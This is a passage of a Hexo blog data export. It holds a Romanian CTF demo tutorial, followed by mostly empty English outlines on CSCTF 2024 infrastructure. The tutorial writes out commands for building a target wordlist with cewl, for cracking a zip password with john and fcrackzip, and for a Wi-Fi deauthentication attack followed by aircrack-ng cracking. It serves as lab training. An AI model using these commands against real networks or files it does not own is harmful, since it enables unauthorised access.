parola</strong></p>\n<ul>\n<li><p><code>Metoda 1</code></p>\n<blockquote>\n<p>Folosim <code>zip2john</code> pentru a converti parola arhivei ntr-un format compatibil cu <code>john</code>.</p>\n</blockquote>\n<pre><code class=\"highlight bash\">zip2john archive.zip &gt; hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>\n</li>\n<li><p><code>Metoda 2</code></p>\n<blockquote>\n<p>Utilizm <code>fcrackzip</code> pentru atac de dicionar direct asupra arhivei.</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y fcrackzip</code></pre>\n<pre><code class=\"highlight bash\">fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt archive.zip</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-D</code></td>\n<td>atac tip Dicionar</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>mai multe informaii (verbos)</td>\n</tr>\n<tr>\n<td><code>-u</code></td>\n<td>ncearc s dezarhiveze cu fiecare parol generat</td>\n</tr>\n<tr>\n<td><code>-p</code></td>\n<td>fiierul cu lista de parole</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<p><strong>Extrage fierul</strong> (nlocuiete parola gsit)</p>\n<pre><code class=\"highlight bash\">unzip -P password archive.zip</code></pre>\n\n\n<br>\n<br>\n\n\n<h2 id=\"4-Wi-Fi\"><a href=\"#4-Wi-Fi\" class=\"headerlink\" title=\"4. Wi-Fi\"></a>4. Wi-Fi</h2><blockquote>\n<p>Spargerea parolei unei reele Wi-Fi protejate</p>\n</blockquote>\n<p><strong>4.1. Inserarea adaptorului de reea (antena)</strong><br><br></p>\n<p><strong>4.2. Configurarea interfeei de reea</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> ifconfig wlan0 down\n<span class=\"built_in\">sudo</span> iwconfig wlan0 mode monitor\n<span class=\"built_in\">sudo</span> ifconfig wlan0 down\niwconfig</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> airmon-ng start wlan0\nairmon-ng check <span class=\"built_in\">kill</span></code></pre>\n\n<p><strong>4.3.Alegerea reelei i clientului int</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> airodump-ng wlan0</code></pre>\n<pre><code class=\"highlight plaintext\">sudo airodump-ng --bssid &lt;INPUT&gt; --channel &lt;INPUT&gt; --write capturefile wlan0</code></pre>\n\n<p><strong>4.4. Deauthentificarea clientului de la reea</strong></p>\n<blockquote>\n<p>Dac trimitem un numr mic de pachete de deautentificare, clientul nu-i va da seama c a fost deconectat,<br>    iar noi vom putea intercepta direct parola criptat trimis de acesta ctre router (access point)</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> aireplay-ng --deauth 4 -a &lt;target_MAC&gt; -c &lt;client_MAC&gt; wlan0</code></pre>\n\n<p><strong>4.5. Spargerea parolei criptate</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> aircrack-ng capturefile.cap -w /usr/share/wordlist/rockyou.txt</code></pre>\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/ctf/\" target=\"_blank\">CTF</a>\n</p>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Al doilea set de exerciii din seria de <code>Demo</code>-uri</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"1-Server-web\"><a href=\"#1-Server-web\" class=\"headerlink\" title=\"1. Server web\"></a>1. Server web</h2><blockquote>\n<p>Executarea unor teste de securitate de baz pe un server web pentru a-i nelege caracteristicile</p>\n</blockquote>\n<p><strong>1.1. Codul surs</strong><br>Deschide pagina n browser la adresa <code>https://chronossec.site</code><br>Vezi codul surs: <code>click-dreapta</code>, <code>View page source</code></p>\n<blockquote>\n<p><strong>TASK</strong>: Ce generator de site este folosit? Ce versiune este? (cuvinte cheie: <code>generator</code>, <code>version</code>)</p>\n</blockquote>\n<br>\n\n<p><strong>1.2. Developer tools - network tab</strong></p>\n<p>Deschide Developer Tools: <code>Fn + F12</code> sau <code>CTRL+SHIFT+I</code><br>Selecteaz <code>Network Tab</code><br>Rencarc pagina pentru a vedea traficul de date: <code>CTRL+R</code></p>\n<blockquote>\n<p><strong>TASK</strong>: Selecteaz doar imagini i salveaz logo-ul paginii.</p>\n</blockquote>\n<br>\n\n<p><strong>1.3. Developer tools - storage tab</strong></p>\n<p>Deschide Developer Tools: <code>Fn + F12</code> sau <code>CTRL+SHIFT+I</code><br>Selecteaz <code>Storage</code><br>Vezi seciunea de <code>Cookies</code></p>\n<blockquote>\n<p><strong>TASK</strong>: terge cookie-urile din browser.</p>\n</blockquote>\n<br>\n\n<p><strong>1.4. Certificat SSL</strong></p>\n<p>Iconia cu lact <br><code>Connection secure</code><br><code>More information</code><br><code>View certificate</code></p>\n<blockquote>\n<p><strong>TASK</strong>: Care este utilizarea cheii? (<code>Key usage</code>)</p>\n</blockquote>\n<br>\n<br>\n\n\n<h2 id=\"2-Parole-personalizate\"><a href=\"#2-Parole-personalizate\" class=\"headerlink\" title=\"2. Parole personalizate\"></a>2. Parole personalizate</h2><blockquote>\n<p>Crearea unor liste de parole personalizate pentru inta atacului</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p /home/kali/demo-1/wordlist/\n<span class=\"built_in\">cd</span> /home/kali/demo-1/wordlist/</code></pre>\n\n<p><strong>Instaleaz aplicaia <code>cewl</code></strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install cewl -y\ncewl --<span class=\"built_in\">help</span></code></pre>\n\n<p><strong>Generarea unei liste de parole personalizate pentru site-ul web ales</strong></p>\n<pre><code class=\"highlight bash\">cewl https://chronossec.site -w wordlist.txt -m 5 -d 1 -v</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-w wordlist.txt</code></td>\n<td>numele fisierului ce va fi generat</td>\n</tr>\n<tr>\n<td><code>-m 5</code></td>\n<td>numarul minim de caractere al cuvintelor selectate</td>\n</tr>\n<tr>\n<td><code>-d 1</code></td>\n<td>depth - adancimea linkurilor verificate</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>verbose - detalii despre process</td>\n</tr>\n</tbody></table>\n<p><strong>Verificarea listei de parole generate</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">cat</span> wordlist.txt\n<span class=\"built_in\">wc</span> -l wordlist.txt</code></pre>\n\n\n<br>\n<br>\n\n\n<h2 id=\"3-Arhiva-ZIP\"><a href=\"#3-Arhiva-ZIP\" class=\"headerlink\" title=\"3. Arhiva ZIP\"></a>3. Arhiva ZIP</h2><pre><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> -p /home/kali/demo-1/archive\n<span class=\"built_in\">cd</span> /home/kali/demo-1/archive</code></pre>\n<blockquote>\n<p>Spargerea unei arhive protejate cu parol<br><strong>Descarc fiierul: <a href=\"https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip\" target=\"_blank\">link</a>.</strong></p>\n</blockquote>\n<pre><code class=\"highlight bash\">wget https://chronossec.site/uploads/ixodron-ctf/demo-1/archive.zip /home/kali/demo-1/archive/archive.zip</code></pre>\n\n<p><strong>Extrage lista extensiv de parole, <code>rockyou.txt</code></strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> gzip -d /usr/share/wordlists/rockyou.txt.gz</code></pre>\n\n<p><strong>Sparge parola</strong></p>\n<ul>\n<li><p><code>Metoda 1</code></p>\n<blockquote>\n<p>Folosim <code>zip2john</code> pentru a converti parola arhivei ntr-un format compatibil cu <code>john</code>.</p>\n</blockquote>\n<pre><code class=\"highlight bash\">zip2john archive.zip &gt; hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>\n</li>\n<li><p><code>Metoda 2</code></p>\n<blockquote>\n<p>Utilizm <code>fcrackzip</code> pentru atac de dicionar direct asupra arhivei.</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> apt install -y fcrackzip</code></pre>\n<pre><code class=\"highlight bash\">fcrackzip -D -v -u -p /usr/share/wordlists/rockyou.txt archive.zip</code></pre>\n<table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Descriere</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-D</code></td>\n<td>atac tip Dicionar</td>\n</tr>\n<tr>\n<td><code>-v</code></td>\n<td>mai multe informaii (verbos)</td>\n</tr>\n<tr>\n<td><code>-u</code></td>\n<td>ncearc s dezarhiveze cu fiecare parol generat</td>\n</tr>\n<tr>\n<td><code>-p</code></td>\n<td>fiierul cu lista de parole</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<p><strong>Extrage fierul</strong> (nlocuiete parola gsit)</p>\n<pre><code class=\"highlight bash\">unzip -P password archive.zip</code></pre>\n\n\n<br>\n<br>\n\n\n<h2 id=\"4-Wi-Fi\"><a href=\"#4-Wi-Fi\" class=\"headerlink\" title=\"4. Wi-Fi\"></a>4. Wi-Fi</h2><blockquote>\n<p>Spargerea parolei unei reele Wi-Fi protejate</p>\n</blockquote>\n<p><strong>4.1. Inserarea adaptorului de reea (antena)</strong><br><br></p>\n<p><strong>4.2. Configurarea interfeei de reea</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> ifconfig wlan0 down\n<span class=\"built_in\">sudo</span> iwconfig wlan0 mode monitor\n<span class=\"built_in\">sudo</span> ifconfig wlan0 down\niwconfig</code></pre>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> airmon-ng start wlan0\nairmon-ng check <span class=\"built_in\">kill</span></code></pre>\n\n<p><strong>4.3.Alegerea reelei i clientului int</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> airodump-ng wlan0</code></pre>\n<pre><code class=\"highlight plaintext\">sudo airodump-ng --bssid &lt;INPUT&gt; --channel &lt;INPUT&gt; --write capturefile wlan0</code></pre>\n\n<p><strong>4.4. Deauthentificarea clientului de la reea</strong></p>\n<blockquote>\n<p>Dac trimitem un numr mic de pachete de deautentificare, clientul nu-i va da seama c a fost deconectat,<br>    iar noi vom putea intercepta direct parola criptat trimis de acesta ctre router (access point)</p>\n</blockquote>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> aireplay-ng --deauth 4 -a &lt;target_MAC&gt; -c &lt;client_MAC&gt; wlan0</code></pre>\n\n<p><strong>4.5. Spargerea parolei criptate</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> aircrack-ng capturefile.cap -w /usr/share/wordlist/rockyou.txt</code></pre>\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/ctf/\" target=\"_blank\">CTF</a>\n</p>\n\n<hr>\n<hr>"},{"title":"1.1. CSCTF 2024 - Infrastructure - GCP","toc":true,"_content":"\n---\n> 1. GCP (Google Cloud Platform) - cloud service used to host the entire infrastructure\n\n---\n<!-- more -->\n\n<br>\n\n## Workflow\n- physical servers\n    - estimate resources\n    - allocate resources\n    - physical arrangement\n- create a network diagram\n- configuration files\n- security\n- implementation\n- debugging\n- test and improve\n\n<br>\n\n## Physical servers\n- resources\n- storage\n- memory \n- CPU\n- backup\n\n\n<br>\n\n## Diagram\n- \n\n<br>\n\n## Configurations\n- kubernetes integration\n\n\n<br>\n\n## Security\n- IDS\n- IPS\n- firewall\n- load balancer\n- autoscalling\n- monitoring\n- network segmentation\n- access control\n\n<br>\n\n## Putting it all together\n\n<br>\n\n## A packet's journey:\n\nUser Request from the Internet:\n    A user types in the domain (e.g., smcc2024.com) in their browser or directly accesses the IP address (.67 or .69).\n\nDNS Resolution (if using domain):\n    If using a domain (smcc2024.com), the request goes to the DNS server (likely Cloudflare).\n    DNS resolves the domain to the corresponding public IP address (.67 or .69).\n\nPacket Leaves User's Device:\n    The packet leaves the user's device and travels through the internet, reaching your network via the ISP.\n\nArrival at the ESXi Host:\n    The packet arrives at the physical NICs (.67 or .69) of your ESXi host.\n\nRouting through IPFire:\n    The packet is received by IPFire, which acts as a router/firewall.\n    IPFire checks the packet against firewall rules to determine its destination based on the target IP (.67 or .69).\n\nRouting to Web Server (.69) or Challenges (.67):\n- If the packet is destined for the web server (.69): \n    IPFire routes it to the Web Server VM (.69).\n    The packet reaches the Web Server VM's internal NIC.\n\n- If the packet is destined for the challenges (.67):\n    IPFire routes it to the Challenges VM (.67).\n    The packet reaches the Challenges VM's internal NIC.\n\nNginx Proxy (Web Server .69):\n    If the packet is for the web server, it arrives at the Web Server VM's internal NIC.\n    Nginx proxy (running on the Web Server VM) intercepts the packet if it's on port 80.\n    Nginx then forwards the request to the appropriate service (e.g., CTFd container running on port 8000).\n\nAccessing Challenges (.67):\n    If the packet is for a challenge:\n        The packet arrives at the Challenges VM's internal NIC.\n        Docker routes the packet to the relevant container based on the exposed port for that challenge.\n\nResponse Packet Journey:\n    After processing the request, the response packet follows a similar path in reverse to reach the user's device, passing through the network components in reverse order.\n\nSummary:\n\nThe packet's journey involves traversing various network components, starting from the user's request, passing through the internet, hitting the ESXi host, being routed by IPFire, and reaching the specific VM (Web Server or Challenges) based on the destination IP and port. The response packet then follows a similar path back to the user's device. Each step involves network routing, firewall checks, and service-specific handling to fulfill the user's request or access to the challenges.\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/1. Infrastructure/1.md","raw":"---\ntitle: 1.1. CSCTF 2024 - Infrastructure - GCP\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 1. Infrastructure\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Infrastructure\n  - GCP\ntoc: true\n---\n\n---\n> 1. GCP (Google Cloud Platform) - cloud service used to host the entire infrastructure\n\n---\n<!-- more -->\n\n<br>\n\n## Workflow\n- physical servers\n    - estimate resources\n    - allocate resources\n    - physical arrangement\n- create a network diagram\n- configuration files\n- security\n- implementation\n- debugging\n- test and improve\n\n<br>\n\n## Physical servers\n- resources\n- storage\n- memory \n- CPU\n- backup\n\n\n<br>\n\n## Diagram\n- \n\n<br>\n\n## Configurations\n- kubernetes integration\n\n\n<br>\n\n## Security\n- IDS\n- IPS\n- firewall\n- load balancer\n- autoscalling\n- monitoring\n- network segmentation\n- access control\n\n<br>\n\n## Putting it all together\n\n<br>\n\n## A packet's journey:\n\nUser Request from the Internet:\n    A user types in the domain (e.g., smcc2024.com) in their browser or directly accesses the IP address (.67 or .69).\n\nDNS Resolution (if using domain):\n    If using a domain (smcc2024.com), the request goes to the DNS server (likely Cloudflare).\n    DNS resolves the domain to the corresponding public IP address (.67 or .69).\n\nPacket Leaves User's Device:\n    The packet leaves the user's device and travels through the internet, reaching your network via the ISP.\n\nArrival at the ESXi Host:\n    The packet arrives at the physical NICs (.67 or .69) of your ESXi host.\n\nRouting through IPFire:\n    The packet is received by IPFire, which acts as a router/firewall.\n    IPFire checks the packet against firewall rules to determine its destination based on the target IP (.67 or .69).\n\nRouting to Web Server (.69) or Challenges (.67):\n- If the packet is destined for the web server (.69): \n    IPFire routes it to the Web Server VM (.69).\n    The packet reaches the Web Server VM's internal NIC.\n\n- If the packet is destined for the challenges (.67):\n    IPFire routes it to the Challenges VM (.67).\n    The packet reaches the Challenges VM's internal NIC.\n\nNginx Proxy (Web Server .69):\n    If the packet is for the web server, it arrives at the Web Server VM's internal NIC.\n    Nginx proxy (running on the Web Server VM) intercepts the packet if it's on port 80.\n    Nginx then forwards the request to the appropriate service (e.g., CTFd container running on port 8000).\n\nAccessing Challenges (.67):\n    If the packet is for a challenge:\n        The packet arrives at the Challenges VM's internal NIC.\n        Docker routes the packet to the relevant container based on the exposed port for that challenge.\n\nResponse Packet Journey:\n    After processing the request, the response packet follows a similar path in reverse to reach the user's device, passing through the network components in reverse order.\n\nSummary:\n\nThe packet's journey involves traversing various network components, starting from the user's request, passing through the internet, hitting the ESXi host, being routed by IPFire, and reaching the specific VM (Web Server or Challenges) based on the destination IP and port. The response packet then follows a similar path back to the user's device. Each step involves network routing, firewall checks, and service-specific handling to fulfill the user's request or access to the challenges.\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/1. Infrastructure/1","published":1,"date":"2024-09-23T06:18:55.832Z","updated":"2024-09-23T06:18:55.832Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmii00326gvg2mlqeiti","content":"<hr>\n<blockquote>\n<ol>\n<li>GCP (Google Cloud Platform) - cloud service used to host the entire infrastructure</li>\n</ol>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Workflow\"><a href=\"#Workflow\" class=\"headerlink\" title=\"Workflow\"></a>Workflow</h2><ul>\n<li>physical servers<ul>\n<li>estimate resources</li>\n<li>allocate resources</li>\n<li>physical arrangement</li>\n</ul>\n</li>\n<li>create a network diagram</li>\n<li>configuration files</li>\n<li>security</li>\n<li>implementation</li>\n<li>debugging</li>\n<li>test and improve</li>\n</ul>\n<br>\n\n<h2 id=\"Physical-servers\"><a href=\"#Physical-servers\" class=\"headerlink\" title=\"Physical servers\"></a>Physical servers</h2><ul>\n<li>resources</li>\n<li>storage</li>\n<li>memory </li>\n<li>CPU</li>\n<li>backup</li>\n</ul>\n<br>\n\n<h2 id=\"Diagram\"><a href=\"#Diagram\" class=\"headerlink\" title=\"Diagram\"></a>Diagram</h2><p>- </p>\n<br>\n\n<h2 id=\"Configurations\"><a href=\"#Configurations\" class=\"headerlink\" title=\"Configurations\"></a>Configurations</h2><ul>\n<li>kubernetes integration</li>\n</ul>\n<br>\n\n<h2 id=\"Security\"><a href=\"#Security\" class=\"headerlink\" title=\"Security\"></a>Security</h2><ul>\n<li>IDS</li>\n<li>IPS</li>\n<li>firewall</li>\n<li>load balancer</li>\n<li>autoscalling</li>\n<li>monitoring</li>\n<li>network segmentation</li>\n<li>access control</li>\n</ul>\n<br>\n\n<h2 id=\"Putting-it-all-together\"><a href=\"#Putting-it-all-together\" class=\"headerlink\" title=\"Putting it all together\"></a>Putting it all together</h2><br>\n\n<h2 id=\"A-packets-journey\"><a href=\"#A-packets-journey\" class=\"headerlink\" title=\"A packets journey:\"></a>A packets journey:</h2><p>User Request from the Internet:<br>    A user types in the domain (e.g., smcc2024.com) in their browser or directly accesses the IP address (.67 or .69).</p>\n<p>DNS Resolution (if using domain):<br>    If using a domain (smcc2024.com), the request goes to the DNS server (likely Cloudflare).<br>    DNS resolves the domain to the corresponding public IP address (.67 or .69).</p>\n<p>Packet Leaves Users Device:<br>    The packet leaves the users device and travels through the internet, reaching your network via the ISP.</p>\n<p>Arrival at the ESXi Host:<br>    The packet arrives at the physical NICs (.67 or .69) of your ESXi host.</p>\n<p>Routing through IPFire:<br>    The packet is received by IPFire, which acts as a router&#x2F;firewall.<br>    IPFire checks the packet against firewall rules to determine its destination based on the target IP (.67 or .69).</p>\n<p>Routing to Web Server (.69) or Challenges (.67):</p>\n<ul>\n<li><p>If the packet is destined for the web server (.69):<br>  IPFire routes it to the Web Server VM (.69).<br>  The packet reaches the Web Server VMs internal NIC.</p>\n</li>\n<li><p>If the packet is destined for the challenges (.67):<br>  IPFire routes it to the Challenges VM (.67).<br>  The packet reaches the Challenges VMs internal NIC.</p>\n</li>\n</ul>\n<p>Nginx Proxy (Web Server .69):<br>    If the packet is for the web server, it arrives at the Web Server VMs internal NIC.<br>    Nginx proxy (running on the Web Server VM) intercepts the packet if its on port 80.<br>    Nginx then forwards the request to the appropriate service (e.g., CTFd container running on port 8000).</p>\n<p>Accessing Challenges (.67):<br>    If the packet is for a challenge:<br>        The packet arrives at the Challenges VMs internal NIC.<br>        Docker routes the packet to the relevant container based on the exposed port for that challenge.</p>\n<p>Response Packet Journey:<br>    After processing the request, the response packet follows a similar path in reverse to reach the users device, passing through the network components in reverse order.</p>\n<p>Summary:</p>\n<p>The packets journey involves traversing various network components, starting from the users request, passing through the internet, hitting the ESXi host, being routed by IPFire, and reaching the specific VM (Web Server or Challenges) based on the destination IP and port. The response packet then follows a similar path back to the users device. Each step involves network routing, firewall checks, and service-specific handling to fulfill the users request or access to the challenges.</p>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<ol>\n<li>GCP (Google Cloud Platform) - cloud service used to host the entire infrastructure</li>\n</ol>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Workflow\"><a href=\"#Workflow\" class=\"headerlink\" title=\"Workflow\"></a>Workflow</h2><ul>\n<li>physical servers<ul>\n<li>estimate resources</li>\n<li>allocate resources</li>\n<li>physical arrangement</li>\n</ul>\n</li>\n<li>create a network diagram</li>\n<li>configuration files</li>\n<li>security</li>\n<li>implementation</li>\n<li>debugging</li>\n<li>test and improve</li>\n</ul>\n<br>\n\n<h2 id=\"Physical-servers\"><a href=\"#Physical-servers\" class=\"headerlink\" title=\"Physical servers\"></a>Physical servers</h2><ul>\n<li>resources</li>\n<li>storage</li>\n<li>memory </li>\n<li>CPU</li>\n<li>backup</li>\n</ul>\n<br>\n\n<h2 id=\"Diagram\"><a href=\"#Diagram\" class=\"headerlink\" title=\"Diagram\"></a>Diagram</h2><p>- </p>\n<br>\n\n<h2 id=\"Configurations\"><a href=\"#Configurations\" class=\"headerlink\" title=\"Configurations\"></a>Configurations</h2><ul>\n<li>kubernetes integration</li>\n</ul>\n<br>\n\n<h2 id=\"Security\"><a href=\"#Security\" class=\"headerlink\" title=\"Security\"></a>Security</h2><ul>\n<li>IDS</li>\n<li>IPS</li>\n<li>firewall</li>\n<li>load balancer</li>\n<li>autoscalling</li>\n<li>monitoring</li>\n<li>network segmentation</li>\n<li>access control</li>\n</ul>\n<br>\n\n<h2 id=\"Putting-it-all-together\"><a href=\"#Putting-it-all-together\" class=\"headerlink\" title=\"Putting it all together\"></a>Putting it all together</h2><br>\n\n<h2 id=\"A-packets-journey\"><a href=\"#A-packets-journey\" class=\"headerlink\" title=\"A packets journey:\"></a>A packets journey:</h2><p>User Request from the Internet:<br>    A user types in the domain (e.g., smcc2024.com) in their browser or directly accesses the IP address (.67 or .69).</p>\n<p>DNS Resolution (if using domain):<br>    If using a domain (smcc2024.com), the request goes to the DNS server (likely Cloudflare).<br>    DNS resolves the domain to the corresponding public IP address (.67 or .69).</p>\n<p>Packet Leaves Users Device:<br>    The packet leaves the users device and travels through the internet, reaching your network via the ISP.</p>\n<p>Arrival at the ESXi Host:<br>    The packet arrives at the physical NICs (.67 or .69) of your ESXi host.</p>\n<p>Routing through IPFire:<br>    The packet is received by IPFire, which acts as a router&#x2F;firewall.<br>    IPFire checks the packet against firewall rules to determine its destination based on the target IP (.67 or .69).</p>\n<p>Routing to Web Server (.69) or Challenges (.67):</p>\n<ul>\n<li><p>If the packet is destined for the web server (.69):<br>  IPFire routes it to the Web Server VM (.69).<br>  The packet reaches the Web Server VMs internal NIC.</p>\n</li>\n<li><p>If the packet is destined for the challenges (.67):<br>  IPFire routes it to the Challenges VM (.67).<br>  The packet reaches the Challenges VMs internal NIC.</p>\n</li>\n</ul>\n<p>Nginx Proxy (Web Server .69):<br>    If the packet is for the web server, it arrives at the Web Server VMs internal NIC.<br>    Nginx proxy (running on the Web Server VM) intercepts the packet if its on port 80.<br>    Nginx then forwards the request to the appropriate service (e.g., CTFd container running on port 8000).</p>\n<p>Accessing Challenges (.67):<br>    If the packet is for a challenge:<br>        The packet arrives at the Challenges VMs internal NIC.<br>        Docker routes the packet to the relevant container based on the exposed port for that challenge.</p>\n<p>Response Packet Journey:<br>    After processing the request, the response packet follows a similar path in reverse to reach the users device, passing through the network components in reverse order.</p>\n<p>Summary:</p>\n<p>The packets journey involves traversing various network components, starting from the users request, passing through the internet, hitting the ESXi host, being routed by IPFire, and reaching the specific VM (Web Server or Challenges) based on the destination IP and port. The response packet then follows a similar path back to the users device. Each step involves network routing, firewall checks, and service-specific handling to fulfill the users request or access to the challenges.</p>\n<br>\n\n<hr>\n<hr>"},{"title":"1.2. CSCTF 2024 - Infrastructure - CTFd","toc":true,"_content":"\n---\n> 2. CTFd - Web framework used to run the CTF\n\n---\n<!-- more -->\n\n<br>\n\n## CTFd as a whole\n\n<br>\n\n## Documentation\n\n<br>\n\n## Containerization\n\n<br>\n\n## Themes and plugins\n\n<br>\n\n## Firewall and proxy\n\n<br>\n\n## SMTP server\n\n<br>\n\n## Customization\n\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/1. Infrastructure/2.md","raw":"---\ntitle: 1.2. CSCTF 2024 - Infrastructure - CTFd\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 1. Infrastructure\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Infrastructure\n  - CTFd\ntoc: true\n---\n\n---\n> 2. CTFd - Web framework used to run the CTF\n\n---\n<!-- more -->\n\n<br>\n\n## CTFd as a whole\n\n<br>\n\n## Documentation\n\n<br>\n\n## Containerization\n\n<br>\n\n## Themes and plugins\n\n<br>\n\n## Firewall and proxy\n\n<br>\n\n## SMTP server\n\n<br>\n\n## Customization\n\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/1. Infrastructure/2","published":1,"date":"2024-09-23T06:18:55.833Z","updated":"2024-09-23T06:18:55.833Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmij00366gvga63x2o6d","content":"<hr>\n<blockquote>\n<ol start=\"2\">\n<li>CTFd - Web framework used to run the CTF</li>\n</ol>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"CTFd-as-a-whole\"><a href=\"#CTFd-as-a-whole\" class=\"headerlink\" title=\"CTFd as a whole\"></a>CTFd as a whole</h2><br>\n\n<h2 id=\"Documentation\"><a href=\"#Documentation\" class=\"headerlink\" title=\"Documentation\"></a>Documentation</h2><br>\n\n<h2 id=\"Containerization\"><a href=\"#Containerization\" class=\"headerlink\" title=\"Containerization\"></a>Containerization</h2><br>\n\n<h2 id=\"Themes-and-plugins\"><a href=\"#Themes-and-plugins\" class=\"headerlink\" title=\"Themes and plugins\"></a>Themes and plugins</h2><br>\n\n<h2 id=\"Firewall-and-proxy\"><a href=\"#Firewall-and-proxy\" class=\"headerlink\" title=\"Firewall and proxy\"></a>Firewall and proxy</h2><br>\n\n<h2 id=\"SMTP-server\"><a href=\"#SMTP-server\" class=\"headerlink\" title=\"SMTP server\"></a>SMTP server</h2><br>\n\n<h2 id=\"Customization\"><a href=\"#Customization\" class=\"headerlink\" title=\"Customization\"></a>Customization</h2><br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<ol start=\"2\">\n<li>CTFd - Web framework used to run the CTF</li>\n</ol>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"CTFd-as-a-whole\"><a href=\"#CTFd-as-a-whole\" class=\"headerlink\" title=\"CTFd as a whole\"></a>CTFd as a whole</h2><br>\n\n<h2 id=\"Documentation\"><a href=\"#Documentation\" class=\"headerlink\" title=\"Documentation\"></a>Documentation</h2><br>\n\n<h2 id=\"Containerization\"><a href=\"#Containerization\" class=\"headerlink\" title=\"Containerization\"></a>Containerization</h2><br>\n\n<h2 id=\"Themes-and-plugins\"><a href=\"#Themes-and-plugins\" class=\"headerlink\" title=\"Themes and plugins\"></a>Themes and plugins</h2><br>\n\n<h2 id=\"Firewall-and-proxy\"><a href=\"#Firewall-and-proxy\" class=\"headerlink\" title=\"Firewall and proxy\"></a>Firewall and proxy</h2><br>\n\n<h2 id=\"SMTP-server\"><a href=\"#SMTP-server\" class=\"headerlink\" title=\"SMTP server\"></a>SMTP server</h2><br>\n\n<h2 id=\"Customization\"><a href=\"#Customization\" class=\"headerlink\" title=\"Customization\"></a>Customization</h2><br>\n\n<hr>\n<hr>"},{"title":"1.3. CSCTF 2024 - Infrastructure - Kubernetes","toc":true,"_content":"\n---\n> 3. Kubernetes - orchestrate docker containers.\n\n---\n<!-- more -->\n\n<br>\n\n## What is Kubernetes\n\n\n<br>\n\n## Orchestration\n\n\n<br>\n\n## Deployment\n\n\n<br>\n\n## Management\n\n\n<br>\n\n---\n---\n","source":"_posts/CTFs/CSCTF 2024/1. Infrastructure/3.md","raw":"---\ntitle: 1.3. CSCTF 2024 - Infrastructure - Kubernetes\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 1. Infrastructure\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Infrastructure\n  - Kubernetes\ntoc: true\n---\n\n---\n> 3. Kubernetes - orchestrate docker containers.\n\n---\n<!-- more -->\n\n<br>\n\n## What is Kubernetes\n\n\n<br>\n\n## Orchestration\n\n\n<br>\n\n## Deployment\n\n\n<br>\n\n## Management\n\n\n<br>\n\n---\n---\n","slug":"CTFs/CSCTF 2024/1. Infrastructure/3","published":1,"date":"2024-09-23T06:18:55.833Z","updated":"2024-09-23T06:18:55.834Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmik003a6gvg18x0cizb","content":"<hr>\n<blockquote>\n<ol start=\"3\">\n<li>Kubernetes - orchestrate docker containers.</li>\n</ol>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"What-is-Kubernetes\"><a href=\"#What-is-Kubernetes\" class=\"headerlink\" title=\"What is Kubernetes\"></a>What is Kubernetes</h2><br>\n\n<h2 id=\"Orchestration\"><a href=\"#Orchestration\" class=\"headerlink\" 